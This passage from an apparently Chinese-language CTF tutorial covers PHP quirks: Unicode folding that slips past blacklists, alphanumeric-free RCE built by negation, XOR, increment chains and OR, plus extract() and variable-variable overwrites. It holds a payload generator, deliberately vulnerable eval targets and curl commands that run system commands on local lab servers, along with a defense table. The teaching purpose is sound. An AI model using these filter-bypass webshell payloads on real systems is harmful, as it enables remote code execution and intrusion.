> 攻击成立需要三个条件同时满足：签名是 `hash(secret || data)` 的裸 MD 结构拼法（md5/sha1/sha256 都中）、secret 长度已知或可枚举（按候选长度各试一遍即可）、data 内容攻击者可控。防御对应三条：把 secret 放尾部（`hash(data || secret)`，追加变成改前文，整个摘要作废）；用 **HMAC**（RFC 2104，`hash_pad(secret) ^ opad` 再包一层哈希，结构上免疫长度扩展）；校验改用 `hash_equals` 恒时比较只是防时序侧信道，挡不住长度扩展本身。现成工具 hashpump 一步出结果，手写版的价值在于看清"摘要即状态"这件事。

## 4. Unicode 规范化与大小写折叠

同一个字形可以有多个 Unicode 表示。`é` 是一个码点（U+00E9，NFC 组合形式），也可以写成 `e` 加组合尖音符（U+0065 + U+0301，NFD 分解形式）。两者在屏幕上一个像素都不差，==字节串却完全不同==，于是 `===`、文件名、哈希、路径匹配全部把它们当两个东西。PHP 侧逐项对照：

```php
<?php
// uni.php —— Unicode 规范化与大小写折叠：PHP 8 逐项对照
error_reporting(E_ALL);

echo "== 两种 é 的字节形态 ==\n";
$nfc = "\u{00E9}";                 // 单码点：U+00E9
$nfd = "e\u{0301}";                // 两个码点：e + 组合尖音符 U+0301
printf("NFC %s: %s (%d 字节)\n", $nfc, bin2hex($nfc), strlen($nfc));
printf("NFD %s: %s (%d 字节)\n", $nfd, bin2hex($nfd), strlen($nfd));
var_dump($nfc === $nfd);
var_dump(strcmp($nfc, $nfd));
var_dump(normalizer_normalize($nfd, Normalizer::FORM_C) === $nfc);
var_dump(normalizer_is_normalized($nfd, Normalizer::FORM_C));

echo "\n== strtolower 与 mb_strtolower ==\n";
$s = "\u{017F}ystem";              // 长ſ U+017F
printf("输入 %s (%s)\n", $s, bin2hex($s));
var_dump(strtolower($s));
var_dump(mb_strtolower($s));
var_dump(mb_strtolower($s) === "system");
$k = "\u{212A}ey";                 // 开尔文记号 K U+212A
var_dump(strtolower($k));
var_dump(mb_strtolower($k));
$e = "\u{00C9}";                   // É
var_dump(strtolower($e));
var_dump(mb_strtolower($e));
$ed = "E\u{0301}";
var_dump(mb_strtolower($ed));

echo "\n== 规范化对字节长度的影响 ==\n";
$name = "caf" . $nfd;              // 看起来 4 个字符
var_dump(strlen($name), mb_strlen($name));
var_dump(substr($name, 0, 4) === "caf" . $nfc);

echo "\n== 大小写折叠后的 == 比较 ==\n";
var_dump(mb_strtolower("ADM\u{0130}N") === "admin");   // 土耳其 İ U+0130
var_dump(mb_strtolower("\u{0130}") === "i\u{0307}");   // İ 折叠成 i+点
var_dump(strtolower("ADM\u{0130}N") === "admin");
```

```bash
php uni.php
```

输出：

```
== 两种 é 的字节形态 ==
NFC é: c3a9 (2 字节)
NFD é: 65cc81 (3 字节)
bool(false)
int(94)
bool(true)
bool(false)

== strtolower 与 mb_strtolower ==
输入 ſystem (c5bf797374656d)
string(7) "ſystem"
string(7) "ſystem"
bool(false)
string(5) "Key"
string(3) "key"
string(2) "É"
string(2) "é"
string(3) "é"

== 规范化对字节长度的影响 ==
int(6)
int(5)
bool(false)

== 大小写折叠后的 == 比较 ==
bool(false)
bool(true)
bool(false)
```

输出里藏了四个层次的事实。**其一**，NFC 是 2 字节、NFD 是 3 字节，`===` 为 false、`strcmp` 非 0；`normalizer_normalize` 能把 NFD 归一到 NFC（需要 intl 扩展）。**其二**，`strtolower` 是字节级函数，多字节序列它一个字节都不敢动——`"ſystem"`、`"Key"`（K 是 3 字节的 U+212A）、`"É"` 原样进出。**其三**，`mb_strtolower` 做 Unicode 小写映射：`É` 折成 `é`，==开尔文记号 K（U+212A）折成 ASCII 的 `k`==——3 字节变 1 字节，"K""e""y" 三个字符变成了 `"key"`；土耳其 `İ`（U+0130）折成 `i` 加组合点两个字符，所以 `"ADMİ N"` 永远折不出 `"admin"`。**其四**，NFD 形态参与字节级截断必出事：`substr($name, 0, 4)` 想取 `"caf" + é`，却在 e 和组合符中间切了一刀。

Python 的 `casefold()` 做**完整大小写折叠**，比小写映射走得更远，与 `mb_strtolower` 的差异一条命令看清：

```bash
python3 -c "print(repr('\u017fystem'.casefold()), repr('\u212aey'.casefold()), repr('\u0130'.casefold()))"
```

输出：

```
'system' 'key' 'i̇'
```

`ſ`（U+017F，长 s）在 PHP 的 `mb_strtolower` 下纹丝不动（它没有小写映射——它本来就是小写字母），在 Python 的 `casefold()` 下折成 ASCII `s`。==小写映射（1:1 替换）与完整折叠（可展开）是两张不同的表==：黑名单引擎用前者的时代，`ſystem` 能骗过 `strtolower` 检查、再被做完整折叠的下游引擎还原成 `system`；而 PHP 内置函数里没有完整折叠，这张表在 Windows 文件系统等平台层才生效。能被 PHP 8 完整打出来的成员是 K（U+212A）——靶子验证它：

```php
<?php
// t4/uni.php —— Unicode 规范化靶（9704）
//   /file?f=<名字>    按文件名读 data/ 下的文件（观察 NFC/NFD 命中差异）
//   /check?s=<串>     字节级黑名单 + Unicode 折叠的白名单
header('Content-Type: text/plain; charset=utf-8');
$path = $_SERVER['PATH_INFO'] ?? '/';

if ($path === '/file') {
    $name = basename($_GET['f'] ?? '');
    $full = __DIR__ . '/data/' . $name;
    echo "按文件名查找: ", bin2hex($name), "\n";
    if (is_file($full)) {
        echo "命中: ", file_get_contents($full), "\n";
    } else {
        echo "未命中: data/ 里只有 café.txt（NFC 形式）\n";
    }
    exit;
}

if ($path === '/check') {
    $s = $_GET['s'] ?? '';
    if (str_contains(strtolower($s), 'key')) {
        echo "blocked: 黑名单命中 key\n";
        exit;
    }
    if (mb_strtolower($s) === 'key') {
        echo "flag{un1c0d3_f0ld}";
    } else {
        echo "no\n";
    }
    exit;
}

echo "endpoints: /file?f=  /check?s=\n";
```

文件系统按字节匹配文件名，`data/` 下的 `café.txt` 是 NFC 形式。两种编码各打一次：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9704/uni.php/file?f=caf%C3%A9.txt'
curl -s --noproxy '*' 'http://127.0.0.1:9704/uni.php/file?f=cafe%CC%81.txt'
```

输出：

```
按文件名查找: 636166c3a92e747874
命中: composed-file-content
```

```
按文件名查找: 63616665cc812e747874
未命中: data/ 里只有 café.txt（NFC 形式）
```

同一视觉文件名，NFC 编码命中、NFD 编码不命中——这既是攻击面（绕"精确文件名"的过滤时换一种编码试试），也是坑（用户输入的规范化形式与库里存的不一致时一切精确匹配失效）。`/check` 端点把 K 折叠的绕过走完：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9704/uni.php/check?s=key'
curl -s --noproxy '*' 'http://127.0.0.1:9704/uni.php/check?s=%E2%84%AAey'
```

输出：

```
blocked: 黑名单命中 key
flag{un1c0d3_f0ld}
```

明文 `key` 被字节级黑名单拦下；`U+212A` 开尔文 K 加 `ey` 在 `strtolower` 眼里是三个高字节加 `ey`、不含 `key` 子串，检查通过，业务侧 `mb_strtolower` 一折叠就还原成 `key`。

> [!info]- Windows 折叠与同形域名：平台层的同类问题
> 文件系统的大小写匹配由平台的折叠表决定。Windows 的 NTFS 用 `$UpCase` 表做不区分大小写匹配，并存在若干超出"逐字符大小写"的折叠规则：土耳其语环境的 `I` 与 `ı` 互折（经典的地域化事故——土耳其 locale 下 `"file".ToUpper()` 得到 `"FİLE"`）；新版本 Windows 对 `ß` 与 `ss` 也做等值折叠，`maß.txt` 与 `mass.txt` 指向同一文件。攻击含义：在 Windows 靶机上，路径过滤按 ASCII 大小写黑名单写时，`i` 可用土耳其 `İ` 顶替、字符串可用 `ß/ss` 这类展开折叠错位。另一个同族场景是国际化域名（IDN）：`аpple.com` 里的 `а` 若是西里尔字母，punycode 转码后是另一个真实的 `xn--` 域名——同形字符（homoglyph）钓鱼的标准姿势，CTF 里见到"域名长得怪"先转 punycode 看。

## 5. 无字母数字 RCE（PHP）

[[W05-命令注入与代码执行#5. 过滤与绕过全集|W05 第 5 节]]讲的是"绕黑名单"：命令名被禁时拆词、换读法。本节的问题更极端：==过滤把字母、数字（有时连下划线）全部禁掉，一个函数名都写不出来，代码还怎么构造==。PHP 的答案是用位运算从"非字母数字的字节"里**造**出字母来：`~`（按字节取反）、`^`（异或）、`|`（按位或）都是只认字节不管语义的运算符，把 0x80–0xFF 的高字节变回 ASCII 即得任意函数名。这四种构造器共用一套靶子：

```php
<?php
// t5/code.php —— 靶 A（9705）：参数里出现字母、数字、下划线即拒绝
header('Content-Type: text/plain; charset=utf-8');
$c = $_GET['c'] ?? '';
if ($c === '' || preg_match('/[\w]/', $c)) {
    echo "blocked: word char\n";
    exit;
}
eval($c);
```

```php
<?php
// t6/code.php —— 靶 B（9706）：参数里出现字母、数字即拒绝（下划线放行）
header('Content-Type: text/plain; charset=utf-8');
$c = $_GET['c'] ?? '';
if ($c === '' || preg_match('/[a-zA-Z0-9]/', $c)) {
    echo "blocked: letter or digit\n";
    exit;
}
eval($c);
```

> [!warning] eval 拼的是语句，句尾分号不能省
> `eval($c)` 把 `$c` 当一段 PHP 语句执行。裸表达式后面没有 `;` 是解析错误，现象是 HTTP 500、响应体为空——和 [[W05-命令注入与代码执行#3.2 代码执行靶|W05 3.2]]的"payload 必须拼成合法整体"是同一条坑的另一种触发方式。本章所有 payload 都以 `;` 结尾。

先看一个 prep 级事实：==payload 里必须放原始字节，不能写 `\x8c` 这种转义==——转义序列里的反斜杠和字母本身就是字符，字母过不了过滤。所以 payload 经 URL 传输时每个高字节写成 `%XX`，到服务端解码成原始字节再进 eval。可用字符的全集：

| 字符/字节 | 相对 `[\w]` 过滤 | 用途 |
| ---- | ---- | ---- |
| 0x80–0xFF 全部 128 个高字节 | 可用 | 三种构造器的原料；还原后就是函数名与参数 |
| `~` `^` `\|` | 可用 | 取反、异或、或三种构造器的运算符 |
| `( ) [ ]` | 可用 | 调用、下标 |
| `"` `'` | 可用 | 字符串字面量（包住高字节） |
| `$` `_` `=` `;` `.` `,` `+` `@` `!` | 可用 | 变量、赋值、语句、拼接、错误抑制、逻辑 |

`$` 与 `_` 是否可用取决于过滤写法：`[\w]` 连 `_` 一起禁（变量名 `$a` 里的字母也没了，只能写不带变量的形态）；`[a-zA-Z0-9]` 放过 `_`，于是 `$_` 这类变量名合法，构造空间大得多。

### 5.1 取反构造（~）

原理最短：ASCII 字节按位取反后落入 0x80–0xFF，`~` 再取反一次就还原。`~"\x8c\x86\x8c\x8b\x9a\x92"` 就是 `"system"`。生成脚本负责把"想调的函数与参数"翻成取反字节并输出两种形态：

```python
# gen_payload.py —— 无字母数字 webshell 的三种字符构造器（节选：取反与生成入口）
import string
import sys
from urllib.parse import quote

def gen_not(word: str, cmd: str) -> str:
    """取反构造：每个 ASCII 字节按位取反后落入 0x80-0xFF 高字节区。"""
    w = bytes(0xFF ^ ord(c) for c in word)
    c = bytes(0xFF ^ ord(x) for x in cmd)
    return f'(~"{w.decode("latin1")}")(~"{c.decode("latin1")}")'

if __name__ == "__main__":
    mode, cmd = sys.argv[1], sys.argv[2]
    php = gen_not("system", cmd)
    raw = php.encode("latin1")
    esc = "".join(chr(b) if 0x20 <= b <= 0x7E else f"\\x{b:02x}" for b in raw)
    print("PHP 形式（\\x 转义显示）:", esc)   # 终端里是原始高字节，此处转义显示
    print("URL 编码 :", quote(raw, safe=""))
```

```bash
python3 gen_payload.py not 'cat flag.txt'
```

输出：

```
PHP 形式（\x 转义显示）: (~"\x8c\x86\x8c\x8b\x9a\x92")(~"\x9c\x9e\x8b\xdf\x99\x93\x9e\x98\xd1\x8b\x87\x8b")
URL 编码 : %28~%22%8C%86%8C%8B%9A%92%22%29%28~%22%9C%9E%8B%DF%99%93%9E%98%D1%8B%87%8B%22%29
```

URL 编码版就是可直接拼进 `?c=` 的形态（打靶时在末尾补上句尾分号的 `%3B`）。先看一个只有 PHP 7 能跑的老形态，它是这条构造器的"出厂样子"：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:9705/code.php?c=%28~%8F%97%8F%96%91%99%90%29%28%29%3B'
```

输出：

```
500
```

服务器日志给出原因：

```
PHP Fatal error:  Uncaught Error: Undefined constant "…" in …/t5/code.php(9) : eval()'d code:1
```

没有引号时，`(~%8F…)` 里的高字节序列被 PHP 当成一个**常量名**——PHP 源码的标识符规则允许 0x80–0xFF 字节出现在名字里。==PHP 7 会把未定义常量降级成同名字符串（附一条 Notice），老 payload `(~%8F%97%8F%96%91%99%90)()` 就靠这一步成立；PHP 8 起未定义常量直接抛 Error==，必须自己加引号把字节包成字符串字面量：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:9705/code.php?c=%28~%22%8F%97%8F%96%91%99%90%22%29%28%29%3B'
curl -s --noproxy '*' 'http://127.0.0.1:9705/code.php?c=%28~%22%8F%97%8F%96%91%99%90%22%29%28%29%3B' | grep -oE 'PHP Version </td><td class="v">[0-9.]+'
```

输出：

```
200
PHP Version </td><td class="v">8.5.4
```

加引号的 `(~"…")()` 成功调用了 `phpinfo()`，输出 8 万多字节的 phpinfo 页，版本行被 grep 出来。把可变参数换成 `system` 与命令，就是可用的 shell：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9705/code.php?c=%28~%22%8C%86%8C%8B%9A%92%22%29%28~%22%9C%9E%8B%DF%99%93%9E%98%D1%8B%87%8B%22%29%3B'
```

输出：

```
flag{h1gh_byt3s_rce}
```

`(~system 的取反字节)((~cat flag.txt 的取反字节))` 在 eval 里还原成 `system("cat flag.txt")`，flag 透传进响应。==整条 payload 不含一个字母、数字或下划线==。

### 5.2 异或构造：拼出 _GET

取反构造的参数写死在 payload 里。更灵活的形态是拼出超全局数组名 `_GET`，让命令通过普通参数传入——靶 B（只禁字母数字、放过 `_`）上最顺手的做法：`\` `^` 两个异或操作数全用标点：

- `` 0x60 ^ 0x3F(`?`) = 0x5F(`_`) ``、`` 0x7B ^ 0x3C(`<`) = 0x47(`G`) ``、`` 0x7B ^ 0x3E(`>`) = 0x45(`E`) ``、`` 0x7B ^ 0x2F(`/`) = 0x54(`T`) ``，所以 `` $_ = "`{{{" ^ "?<>/" `` 得到字符串 `"_GET"`；
- `${$_}` 二次解引用成 `$_GET`，再按下标取参、按名调用。

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9706/code.php?c=%24_%3D%22%60%7B%7B%7B%22%5E%22%3F%3C%3E%2F%22%3B%24%7B%24_%7D%5B%22_%22%5D%28%24%7B%24_%7D%5B%22__%22%5D%29%3B&_=system&__=cat%20flag.txt'
```

输出：

```
flag{n0_4lph4num}
```

payload 展开后是 `$_="`{{{"^"?<>/";${$_}["_"](${$_}["__"]);`——之后命令藏在两个普通参数里，想换命令不用重造 payload。==这个形态的价值是把"payload"与"命令"分离==：一次构造，反复使用。

### 5.3 自增链：从 `Array` 里长出字母

靶 B 还有一种不依赖位运算的构造：PHP 对字符串做 `++` 时按 Perl 风格进位——`'A'++` 得 `'B'`，`'Z'++` 进位成 `'AA'`，`'9'++` 进位成 `10`。先看行为表：

```php
<?php
// inc.php —— PHP 字符串自增的 Perl 式进位
$a = 'A';
$a++; var_dump($a);
$c = 'A';
for ($i = 0; $i < 6; $i++) $c++;   var_dump($c);
$z = 'Z';
$z++; var_dump($z);
$n = '9';
$n++; var_dump($n);
$s = 'Array';
var_dump($s[0]);
```

```bash
php inc.php
```

输出：

```
string(1) "B"
string(1) "G"
string(2) "AA"
int(10)
string(1) "A"
```

构造的起点是 `[]`：空数组转成字符串是 `"Array"`，取首字符得 `'A'`（下标用 `"!"=="@"` 这个恒 false 表达式顶替数字 `0`）。`'A'` 自增 6、4、19 步得到 `G`、`E`、`T`，加上直接写的 `'_'`（靶 B 只禁字母数字），拼出 `"_GET"`。生成器把这些 `++` 循环展开成纯字符序列：

```python
# gen_payload.py（节选：自增链）
def gen_chain(_: str, __: str) -> str:
    head = '$_=[];$_=@"$_";$_=$_["!"=="@"];'      # $_ = "A"
    body = '$___=$_;$____="_";'

    def incs(n: int) -> str:
        return "$__=$___;" + "$__++;" * n + '$____.=$__;'

    body += incs(6) + incs(4) + incs(19)           # G、E、T
    tail = "${$____}['@'](${$____}['!']);"
    return head + body + tail
```

```bash
python3 gen_payload.py chain x
```

输出：

```
PHP 形式（\x 转义显示）: $_=[];$_=@"$_";$_=$_["!"=="@"];$___=$_;$____="_";$__=$___;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$___;$__++;$__++;$__++;$__++;$____.=$__;$__=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;${$____}['@'](${$____}['!']);
URL 编码 : %24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%22%21%22%3D%3D%22%40%22%5D%3B%24___%3D%24_%3B%24____%3D%22_%22%3B%24__%3D%24___%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24___%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24___%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24%7B%24____%7D%5B%27%40%27%5D%28%24%7B%24____%7D%5B%27%21%27%5D%29%3B
字母/数字 : _
```

自检栏里只有 `_`（靶 B 放行的下划线），没有字母数字。参数名同样避开字母数字，用 `@` 与 `!`：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9706/code.php?c=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%22%21%22%3D%3D%22%40%22%5D%3B%24___%3D%24_%3B%24____%3D%22_%22%3B%24__%3D%24___%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24___%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24___%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24%7B%24____%7D%5B%27%40%27%5D%28%24%7B%24____%7D%5B%27%21%27%5D%29%3B&%40=system&%21=cat%20flag.txt'
```

输出：

```
flag{n0_4lph4num}
```

自增链的长度远超异或构造，它的价值在==不依赖任何高字节==：整条 payload 是纯 ASCII，能在"高字节也被过滤"或"传输层吃非 ASCII"的场景下存活。

### 5.4 或构造与回调家族

或构造为每个目标字符找一对"非字母数字"字节，按位或出结果。它和取反、异或共用同一骨架，差别只在生成器里的字节配对（对每个字符在非字母数字字节里穷举出 `a|b == ord(c)` 的组合）：

```python
# gen_payload.py（节选：或构造）
def printable_pri(b: int) -> int:
    """可打印标点优先于控制字节，让输出尽量可读。"""
    return 0 if 0x20 <= b <= 0x7E else 1

def gen_or(word: str, cmd: str) -> str:
    """或构造：为每个字符找一对"非字母数字"字节，按位或出目标字符。"""
    NONWORD = sorted(set(range(0x01, 0x80))
                     - set(map(ord, string.ascii_letters + string.digits + "_")))

    def split(ch: str):
        t = ord(ch)
        cands = [(printable_pri(a) + printable_pri(b), a, b)
                 for a in NONWORD for b in NONWORD if a | b == t]
        _, a, b = min(cands)
        return a, b
    # ……把 word 与 cmd 逐字符 split 后拼成 ("…"|"…")("…"|"…")，同 5.1 的骨架
```

```bash
python3 gen_payload.py or 'cat flag.txt'
```

输出：

```
PHP 形式（\x 转义显示）: ("\x13\x19\x13\x14%-"|"````@@")("#!\x14 &,!' \x14\x18\x14"|"@@` @@@@.```")
URL 编码 : %28%22%13%19%13%14%25-%22%7C%22%60%60%60%60%40%40%22%29%28%22%23%21%14%20%26%2C%21%27%20%14%18%14%22%7C%22%40%40%60%20%40%40%40%40.%60%60%60%22%29%3B
字母/数字 : （无）
```

或操作数的搜索结果里会出现控制字节（如 `%13`）——URL 层照常编码。打靶：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9705/code.php?c=%28%22%13%19%13%14%25-%22%7C%22%60%60%60%60%40%40%22%29%28%22%23%21%14%20%26%2C%21%27%20%14%18%14%22%7C%22%40%40%60%20%40%40%40%40.%60%60%60%22%29%3B'
```

输出：

```
flag{h1gh_byt3s_rce}
```

第四个成员是**回调家族**：凡是文档里写 callable 的参数位（`array_map`、`usort`、`call_user_func`、`array_filter`……），把取反构造的字符串填进回调位就是一次函数调用。`array_map` 在 PHP 8 下照常接受字符串回调，名与参都用取反字节构造：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9705/code.php?c=%28~%22%9E%8D%8D%9E%86%A0%92%9E%8F%22%29%28%28~%22%8C%86%8C%8B%9A%92%22%29%2C%5B%28~%22%9C%9E%8B%DF%99%93%9E%98%D1%8B%87%8B%22%29%5D%29%3B'
```

输出：

```
flag{h1gh_byt3s_rce}
```

> [!info]- 回调家族里已经消失的成员：/e 与 create_function
> 正则路线的祖师爷是 `preg_replace` 的 `/e` 修饰符：`preg_replace('/匹配/e', '替换串', $input)` 在匹配后把**替换串当 PHP 代码执行**——它让"正则命中"直接等于代码执行，PHP 5 时代大量靶子以它为核心。PHP 7.0 移除了 `/e`，等价写法是 `preg_replace_callback`（回调，不再执行字符串）。同一波清理里，`create_function`（内部就是一次 `eval`）在 PHP 8.0 移除，字符串形式的 `assert` 在 PHP 8.0 失效——这两条 [[W05-命令注入与代码执行#2.2 代码执行入口|W05 2.2]]的表格已收。识别意义不变：题解里出现 `/e`、`create_function`、字符串 `assert`，说明靶子跑在旧版 PHP 上，历史 payload 可以直接试；反过来在 PHP 8 靶上这三条路都不必再试。

四种构造器的取舍一句话：==取反最短、异或可分离命令、自增链不需要高字节、或构造在取反被禁时顶上==；过滤越紧，构造器链越长，但"从非字母数字字节造出任意函数调用"这件事本身在 PHP 8 下依然成立。

## 6. 其他 Tricky 速览

本节收拢五条高频但体量小的语言怪癖，每条给最小演示或靶场。

**intval：截断、进制与精度。** `intval` 把值向零截断成整数，行为里有三个坑：科学计数法字符串合法（`intval("1e3")` 是 1000）；十六进制前缀不被默认解析（`intval("0x1A")` 是 0，`intval("1A", 16)` 才是 26）；浮点精度误差会让"先算后截"出错。[[W13-逻辑与认证漏洞#5.1 金额与数量：负数、超大数、浮点|W13 5.1]]的支付靶见过它的截断面（`intval(-0.5)` 是 0，负数小数被吃掉）：

```php
<?php
// cmp2.php（节选）
var_dump(intval("1e3"), intval("0x1A"), intval("1abc"), intval("1A", 16));
var_dump(intval((0.1 + 0.7) * 10));
var_dump(0.1 + 0.7);
var_dump(intval("-0.5"));
```

```bash
php cmp2.php
```

输出（intval 段）：

```
int(1000)
int(0)
int(1)
int(26)
int(7)
float(0.7999999999999999)
int(0)
```

`0.1 + 0.7` 是 `0.7999999999999999`，`intval` 截断后得 7——==经典的"加价 10% 后 intval"把 8 折成 7==，凡"先浮点运算再取整"的金额/次数逻辑都该按这条查。

**`str_replace` 链式删除。** 黑名单用 `str_replace` 删除关键字时，删除只做一轮，==把关键字拆开嵌进自身就能在删除后重组==：

```php
<?php
// cmp2.php（节选）
echo str_replace('union', '', 'ununionion select'), "\n";
echo str_replace('admin', '', 'adadminmin'), "\n";
```

输出：

```
union select
admin
```

`ununionion` 中间的 `union` 被删掉，两侧残片拼回 `union`。[[W04-SQL注入#8. WAF 基础绕过|W04 第 8 节]]的 WAF 靶在 level 1→2 打过同一形态（删除 `union` 后 `ununionion select` 穿透）；防御写法是循环删到不再变化，或换 `preg_match` 白名单。

**`extract()` 变量覆盖。** `extract` 把数组的键值对导入当前符号表，默认策略 `EXTR_OVERWRITE` 意味着==同名键直接盖掉已有变量==。靶子先固定 `$auth = false`，再 extract 用户输入：

```php
<?php
// t7/extract.php —— extract() 变量覆盖
header('Content-Type: text/plain; charset=utf-8');
$auth = false;
extract($_GET);                    // 默认 EXTR_OVERWRITE：同名键直接盖掉已有变量
if ($auth === 'admin') {
    echo "flag{v4r_0verwr1te}\n";
} else {
    echo "no, auth=", var_export($auth, true), "\n";
}
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9707/extract.php'
curl -s --noproxy '*' 'http://127.0.0.1:9707/extract.php?auth=admin'
```

输出：

```
no, auth=false
flag{v4r_0verwr1te}
```

**`$$` 可变变量。** `foreach ($_GET as $k => $v) $$k = $v;` 是 `extract` 的手写版，键名进变量名、值进变量值，效果相同：

```php
<?php
// t7/vars.php —— 可变变量 $$ 的批量覆盖
header('Content-Type: text/plain; charset=utf-8');
$config = ['debug' => false];
foreach ($_GET as $k => $v) {
    $$k = $v;
}
if (!empty($debug)) {
    echo "flag{doub1e_d0llar} debug=", var_export($debug, true), "\n";
} else {
    echo "no\n";
}
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9707/vars.php'
curl -s --noproxy '*' 'http://127.0.0.1:9707/vars.php?debug=1'
```

输出：

```
no
flag{doub1e_d0llar} debug='1'
```

两条覆盖路的防御一致：`extract` 改用 `EXTR_SKIP` 或干脆传数组访问（`$input['auth']`）；永远不用用户输入的键名注册变量。

**`preg_replace` `/e` 的版本背景。** 在 PHP 5 的世界里，`preg_replace('/pattern/e', $replacement, $subject)` 会在匹配后把替换串当 PHP 代码执行，"正则替换"因此成为代码执行入口；PHP 7.0 移除该修饰符，PHP 7+ 的等价物 `preg_replace_callback` 只调用回调、不执行字符串。这条与 `create_function`（PHP 8.0 移除）、字符串 `assert`（PHP 8.0 失效）同属"历史入口"：见到即可断定靶子在旧版本上，历史 payload 直接上；见不到也不必在 PHP 8 靶上浪费尝试。

## 7. 防御视角

本章所有坑共用一个根源：==把"值应该是什么类型"交给运行时猜测==。防御就是把猜测全部换成声明，逐条对应：

| 坑 | 防御写法 | 保证 |
| ---- | ---- | ---- |
| `==` 的类型暗示（1.1、1.5） | `===`/`!==` 比较；文件头 `declare(strict_types=1);` + 函数参数类型声明 | 类型不对直接 TypeError，不再暗示转换 |
| 0e 魔法哈希、真碰撞（1.2、2） | 摘要比较用 `===`，更准确用 `hash_equals()`；md5/sha1 换 `hash('sha256', …)`；签名用 HMAC | 恒时比较；碰撞攻击面消失 |
| `in_array`/`switch` 松散（1.4） | `in_array(..., ..., true)`；switch 前先 `settype` 或匹配后校验类型 | 白名单按字面值生效 |
| 数组传参吃 NULL（1.3） | PHP 8 已修复（TypeError）；老版本升级或入口处 `is_string()` 收口 | — |
| 长度扩展（3） | `hash(data \|\| secret)` 或 HMAC；`hash_equals` 校验 | 伪造签名不可构造 |
| Unicode 两种编码、折叠差异（4） | 判断前 `normalizer_normalize($s, Normalizer::FORM_C)`；比较用 `mb_strtolower` 并明确其折叠边界 | 两种编码归一后再比 |
| 无字母数字构造（5） | 不用 `eval`/可变变量/字符串回调收输入；函数白名单映射（`$map = ['f1' => 'strlen', …]` 后查表） | 输入永远只做查表键，不做代码 |
| 变量覆盖（6） | 不 `extract($_GET)`；键名白名单；`EXTR_SKIP` | 用户输入进不了符号表 |

两条收束：其一，==PHP 8 对比较规则与参数类型的收紧，本身就是这批考点最大的"官方修复"==——同一份漏洞代码在 PHP 7 与 PHP 8 上行为不同，兼容性升级消灭一整层攻击面；其二，规范化要先于判断（Unicode 归一、类型收口都发生在比较之前），==比较发生在规范化之后的输入上才有意义==。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| md5 的 0e 对在 sha1 校验上过不去 | 0e 集合按算法各有一份，互不通用：md5 用 240610708/QNKCDZO 一族，sha1 换 aaroZmOk/aaK1STfY 一族（[[#1.2 0e 魔法哈希：md5 与 sha1 各自的集合\|1.2]]） |
| 取反 payload 在 PHP 8 靶上 500，日志报 Undefined constant | 裸高字节成了常量名：给字节串加引号，`(` 后跟 `~%22…%22`（[[#5.1 取反构造（~）\|5.1]]） |
| payload 里写 `\x8c` 一类转义不生效 | 转义序列含字母过不了过滤：传原始字节，URL 层用 %XX 表示（[[#5. 无字母数字 RCE（PHP）\|第 5 节]]开篇） |
| eval 靶 500 且响应体为空 | payload 缺句尾分号，或 `+` 被解码成空格破坏了表达式：补 `;`，加号写 `%2B`（[[W05-命令注入与代码执行#3.2 代码执行靶\|W05 3.2]]） |
| 老题解的数组绕 md5 打不出 flag | PHP 8 起标量函数收数组抛 TypeError：确认靶子版本，PHP 7 及以前才成立（[[#1.3 md5(数组)：从 NULL 到 TypeError 的版本分界\|1.3]]） |
| `in_array("abc", [0])` 行为与题解不符 | PHP 7 为 true、PHP 8 为 false：数字与非数字字符串的比较规则改了（[[#1.1 == 的转换规则\|1.1]]） |
| 碰撞文件打不中靶 | 字节在传输/编辑环节被改（追加换行、行尾转换、编码失败）：`od -c \| tail` 对照首尾、`md5sum` 对已知值（[[#2. md5 真碰撞：与 0e 的本质区别\|第 2 节]]） |
| 长度扩展伪造签名返回 bad signature | secret 长度猜错，或续算起点没对齐到 64 字节：按候选长度枚举，glue 补齐后对齐校验（[[#3. 哈希长度扩展：sha1(secret\|\|data) 的伪造签名\|第 3 节]]） |
